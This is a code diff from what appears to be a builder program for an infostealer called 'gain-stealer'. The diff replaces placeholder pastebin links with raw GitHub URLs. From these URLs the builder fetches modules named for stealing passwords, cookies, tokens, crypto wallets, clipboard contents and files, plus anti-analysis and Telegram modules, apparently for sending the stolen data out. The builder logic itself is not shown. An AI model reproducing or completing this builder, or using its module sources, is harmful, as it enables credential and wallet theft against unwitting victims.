@@ -17,19 +17,19 @@ class ModularGainBuilder:
         self.root.geometry("1000x700")
         
         self.raw_urls = {
-            'imports': 'https://pastebin.com/raw/IMPORTS_CODE',
+            'imports': 'https://raw.githubusercontent.com/exsarorrayzer/gain-stealer/refs/heads/main/raw/imports.py',
             'config': 'https://github.com/exsarorrayzer/gain-stealer/blob/main/raw/config.py',
             'anti_analysis': 'https://raw.githubusercontent.com/exsarorrayzer/gain-stealer/refs/heads/main/raw/anti_analysis.py',
-            'password_stealer': 'https://pastebin.com/raw/PASSWORD_STEALER',
+            'password_stealer': 'https://raw.githubusercontent.com/exsarorrayzer/gain-stealer/refs/heads/main/raw/password_stealer.py',
             'cookie_stealer': 'https://raw.githubusercontent.com/exsarorrayzer/gain-stealer/refs/heads/main/raw/cookie_stealer.py',
-            'token_stealer': 'https://pastebin.com/raw/TOKEN_STEALER',
-            'wallet_stealer': 'https://pastebin.com/raw/WALLET_STEALER',
-            'system_info': 'https://pastebin.com/raw/SYSTEM_INFO',
+            'token_stealer': 'https://raw.githubusercontent.com/exsarorrayzer/gain-stealer/refs/heads/main/raw/token_stealer.py',
+            'wallet_stealer': 'https://raw.githubusercontent.com/exsarorrayzer/gain-stealer/refs/heads/main/raw/wallet_stealer.py',
+            'system_info': 'https://raw.githubusercontent.com/exsarorrayzer/gain-stealer/refs/heads/main/raw/system_info.py',
             'clipboard': 'https://raw.githubusercontent.com/exsarorrayzer/gain-stealer/refs/heads/main/raw/clipboard.py',
-            'telegram': 'https://pastebin.com/raw/TELEGRAM',
+            'telegram': 'https://raw.githubusercontent.com/exsarorrayzer/gain-stealer/refs/heads/main/raw/telegram.py',
             'file_grabber': 'https://raw.githubusercontent.com/exsarorrayzer/gain-stealer/refs/heads/main/raw/file_grabber.py',
             'data_handler': 'https://raw.githubusercontent.com/exsarorrayzer/gain-stealer/refs/heads/main/raw/data_handler.py',
-            'main': 'https://pastebin.com/raw/MAIN_CODE'
+            'main': 'https://raw.githubusercontent.com/exsarorrayzer/gain-stealer/refs/heads/main/raw/main.py'
         }
         
         # Değişkenler
